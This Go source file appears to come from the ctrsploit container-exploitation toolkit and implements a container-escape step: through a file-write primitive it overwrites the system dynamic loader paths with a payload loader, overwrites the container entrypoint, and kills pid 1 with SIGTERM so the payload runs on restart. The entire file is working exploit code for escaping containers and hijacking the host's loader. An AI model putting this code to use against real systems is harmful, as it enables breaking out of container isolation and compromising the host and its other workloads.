package pipeprimitive

import (
	"fmt"
	"os"
	"syscall"
	"time"

	"github.com/ctrsploit/sploit-spec/pkg/log"
)

type restartMaterialPaths struct {
	loaders   []string
}

var restartPaths = restartMaterialPaths{
	loaders: []string{
		"/lib64/ld-linux-x86-64.so.2",
		"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
	},
}

func EscapeRestart(primitive Primitive, pid int, payload []byte, timeout time.Duration) error {
	if pid <= 0 {
		pid = 1
	}
	if err := WriteRestartMaterial(primitive, payload); err != nil {
		return err
	}
	log.Logger.Info("Prepared restart capture material successfully")
	if err := WriteProcessEntrypointAsSelf(primitive, pid); err != nil {
		return err
	}
	log.Logger.Info("Overwritten container entrypoint successfully")
	log.Logger.Info("Triggering container restart ...")
	time.Sleep(time.Second)
	_ = syscall.Kill(pid, syscall.SIGTERM)
	return nil
}

func WriteRestartMaterial(primitive Primitive, payload []byte) error {
	return writeRestartMaterial(primitive, payload, restartPaths)
}

func writeRestartMaterial(primitive Primitive, payload []byte, paths restartMaterialPaths) error {
	provider, ok := primitive.(RestartLoaderProvider)
	if !ok {
		return fmt.Errorf("%s does not provide a restart loader", primitive.GetExpName())
	}
	loader, err := provider.RestartLoader(payload)
	if err != nil {
		return fmt.Errorf("%s restart loader: %w", primitive.GetExpName(), err)
	}
	return writeRestartLoaders(primitive, loader, paths)
}

func writeRestartLoaders(primitive Primitive, loader []byte, paths restartMaterialPaths) error {
	if len(loader) == 0 {
		return fmt.Errorf("restart loader is empty")
	}

	writtenLoader := false
	for _, target := range paths.loaders {
		if _, err := os.Stat(target); err != nil {
			if os.IsNotExist(err) {
				continue
			}
			return fmt.Errorf("stat restart loader %q: %w", target, err)
		}
		if err := WriteImage(primitive, target, loader); err != nil {
			return fmt.Errorf("write restart loader %q: %w", target, err)
		}
		writtenLoader = true
	}
	if !writtenLoader {
		return fmt.Errorf("no supported restart loader path exists")
	}
	return nil
}
